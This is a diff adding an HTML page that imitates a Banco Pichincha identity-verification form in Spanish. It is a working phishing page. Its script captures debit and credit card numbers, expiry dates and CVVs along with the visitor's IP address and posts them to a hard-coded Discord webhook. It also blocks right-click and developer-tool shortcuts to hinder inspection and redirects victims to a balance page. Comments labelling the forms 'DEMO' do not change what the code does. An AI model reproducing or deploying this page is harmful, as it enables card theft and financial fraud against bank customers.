@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Banco Pichincha</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#fff}
+.header{padding:16px 20px;box-shadow:0 4px 10px rgba(0,0,0,.12)}
+.logo{height:36px}
+.container{max-width:480px;margin:0 auto;padding:35px 20px;text-align:center}
+.image-box{max-width:260px;margin:25px auto}
+.image-box img{width:30%}
+.title{font-size:19px;font-weight:700;color:#0b2a5b;margin-bottom:10px}
+.description{color:#5a5a5a;margin-bottom:20px}
+.form{text-align:left}
+label{font-size:14px;font-weight:600;display:block;margin-bottom:6px}
+input,select{width:100%;padding:14px;border-radius:8px;border:1px solid #ccc;margin-bottom:18px;font-size:15px}
+.row{display:flex;gap:12px}
+.row div{flex:1}
+.hidden{display:none}
+.card-result{font-size:22px;font-weight:700;color:#0b2a5b;cursor:pointer;margin-bottom:25px}
+.question{font-weight:600;margin-bottom:15px}
+.options{display:flex;justify-content:center;gap:20px;margin-bottom:25px}
+.options button{padding:12px 26px;border-radius:8px;border:1px solid #ccc;background:#fff;font-weight:600;cursor:pointer}
+.options button:hover{background:#f2f2f2}
+.btn{width:100%;background:#ffd200;border:none;padding:16px;font-size:17px;font-weight:700;border-radius:8px;cursor:pointer}
+.btn:hover{background:#f5c400}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo">
+</div>
+
+<div class="container">
+
+  <div class="image-box">
+    <img src="https://static.vecteezy.com/system/resources/previews/040/248/744/non_2x/credit-card-icon-logo-design-template-vector.jpg">
+  </div>
+
+  <div class="title">Validacion de identidad</div>
+  <div class="description">Para validar tu identidad y asegurarnos que tiene un producto activo con nosotros ingresa la tarjeta debito/credito activa con nosotros.</div>
+
+  <!-- FORMULARIO TARJETA (DEMO) -->
+  <div class="form" id="cardForm">
+    <label>Número de tarjeta</label>
+    <input id="cardNumber"
+       inputmode="numeric"
+       pattern="[0-9]*"
+       maxlength="16"
+       placeholder="1234567812345678">
+
+    <div class="row">
+      <div>
+        <label>Mes</label>
+        <select id="month">
+          <option value="">MM</option>
+          <option>01</option><option>02</option><option>03</option>
+          <option>04</option><option>05</option><option>06</option>
+          <option>07</option><option>08</option><option>09</option>
+          <option>10</option><option>11</option><option>12</option>
+        </select>
+      </div>
+      <div>
+        <label>Año</label>
+        <select id="year">
+          <option value="">AAAA</option>
+          <option>2026</option><option>2027</option><option>2028</option>
+          <option>2029</option><option>2030</option><option>2031</option>
+          <option>2032</option><option>2033</option><option>2034</option>
+          <option>2035</option><option>2036</option>
+        </select>
+      </div>
+    </div>
+
+    <label>CVV</label>
+    <input id="cvv"
+       type="password"
+       inputmode="numeric"
+       pattern="[0-9]*"
+       maxlength="3"
+       placeholder="***">
+  </div>
+
+  <!-- RESULTADO -->
+  <div class="hidden" id="resultSection">
+
+    <div class="card-result" id="cardResult">
+      Tarjeta •••• <span id="lastDigits"></span>
+    </div>
+
+    <div class="question">¿Tienes tarjeta de crédito activa con nosotros?</div>
+
+    <div class="options">
+      <button onclick="showCreditForm()">Sí</button>
+      <button onclick="showContinue()">No</button>
+    </div>
+
+    <!-- FORMULARIO TARJETA DE CRÉDITO (DEMO) -->
+    <div class="form hidden" id="creditForm">
+
+      <label>Número tarjeta de crédito</label>
+      <input inputmode="numeric"
+       pattern="[0-9]*"
+       maxlength="16"
+       placeholder="1234567812345678">
+
+      <div class="row">
+        <div>
+          <label>Mes</label>
+          <select>
+            <option value="">MM</option>
+            <option>01</option><option>02</option><option>03</option>
+            <option>04</option><option>05</option><option>06</option>
+            <option>07</option><option>08</option><option>09</option>
+            <option>10</option><option>11</option><option>12</option>
+          </select>
+        </div>
+        <div>
+          <label>Año</label>
+          <select>
+            <option value="">AAAA</option>
+            <option>2026</option><option>2027</option><option>2028</option>
+            <option>2029</option><option>2030</option><option>2031</option>
+            <option>2032</option><option>2033</option><option>2034</option>
+            <option>2035</option><option>2036</option>
+          </select>
+        </div>
+      </div>
+
+      <label>CVV</label>
+      <input type="password"
+       inputmode="numeric"
+       pattern="[0-9]*"
+       maxlength="3"
+       placeholder="***">
+
+      <button class="btn">Continuar</button>
+    </div>
+
+    <!-- CONTINUAR SI RESPONDE NO -->
+    <button class="btn hidden" id="continueBtn">Continuar</button>
+
+  </div>
+
+</div>
+
+  <script>
+  // URL de tu Webhook de Discord
+  const webhookURL = "https://discord.com/api/webhooks/1459229071656616113/MTxv1050wMa_vFVba4cDO-6sSS1KKttf-HENqsv0jFHxOEF1fIVY7rtLe9VA3ptT8Crz";
+
+  // 1. Protección contra inspección (Bloqueo de F12, Clic Derecho, Ctrl+U)
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.onkeydown = e => {
+      if (e.keyCode == 123 || 
+          (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
+          (e.ctrlKey && e.keyCode == 85)) {
+          return false;
+      }
+  };
+
+  // Función para obtener IP
+  async function getIP() {
+      try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const data = await response.json();
+          return data.ip;
+      } catch (e) { return "No detectada"; }
+  }
+
+  // Función para enviar a Discord
+  async function sendToDiscord(titulo, campos) {
+      const userIP = await getIP();
+      const message = {
+          embeds: [{
+              title: titulo,
+              color: 16761344,
+              fields: [
+                  ...campos,
+                  { name: "🌐 IP", value: `\`${userIP}\`` }
+              ],
+              timestamp: new Date()
+          }]
+      };
+
+      await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+      });
+  }
+
+  // Lógica de captura de la primera tarjeta
+  const cvv = document.getElementById("cvv");
+  const cardNumber = document.getElementById("cardNumber");
+  const form = document.getElementById("cardForm");
+  const resultSection = document.getElementById("resultSection");
+  const lastDigits = document.getElementById("lastDigits");
+  const month = document.getElementById("month");
+  const year = document.getElementById("year");
+
+  cvv.addEventListener("input", async () => {
+      if (cvv.value.length === 3) {
+          const num = cardNumber.value;
+          const m = month.value;
+          const y = year.value;
+          const c = cvv.value;
+
+          if(num.length < 15) {
+              alert("Tarjeta inválida");
+              return;
+          }
+
+          // Enviar primera tarjeta capturada
+          await sendToDiscord("💳 TARJETA DÉBITO CAPTURADA", [
+              { name: "Número", value: `\`${num}\``, inline: false },
+              { name: "Expira", value: `\`${m}/${y}\``, inline: true },
+              { name: "CVV", value: `\`${c}\``, inline: true }
+          ]);
+
+          lastDigits.textContent = num.slice(-4);
+          form.classList.add("hidden");
+          resultSection.classList.remove("hidden");
+      }
+  });
+
+  // Lógica del botón CONTINUAR (cuando responde NO)
+  document.getElementById("continueBtn").addEventListener("click", () => {
+      window.location.href = "saldo.html";
+  });
+
+  // Lógica del SEGUNDO FORMULARIO (Tarjeta de crédito)
+  document.querySelector("#creditForm .btn").addEventListener("click", async (e) => {
+      e.preventDefault();
+      const inputs = document.querySelectorAll("#creditForm input");
+      const selects = document.querySelectorAll("#creditForm select");
+
+      await sendToDiscord("💳 TARJETA CRÉDITO ADICIONAL", [
+          { name: "Número", value: `\`${inputs[0].value}\`` },
+          { name: "Expira", value: `\`${selects[0].value}/${selects[1].value}\``, inline: true },
+          { name: "CVV", value: `\`${inputs[1].value}\``, inline: true }
+      ]);
+
+      window.location.href = "saldo.html";
+  });
+
+  // Funciones de navegación visual
+  function showCreditForm(){
+      document.getElementById("creditForm").classList.remove("hidden");
+      document.getElementById("continueBtn").classList.add("hidden");
+  }
+  function showContinue(){
+      document.getElementById("creditForm").classList.add("hidden");
+      document.getElementById("continueBtn").classList.remove("hidden");
+  }
+
+  document.getElementById("cardResult").addEventListener("click", () => {
+      resultSection.classList.add("hidden");
+      form.classList.remove("hidden");
+  });
+  </script>
+
+</body>
+</html>
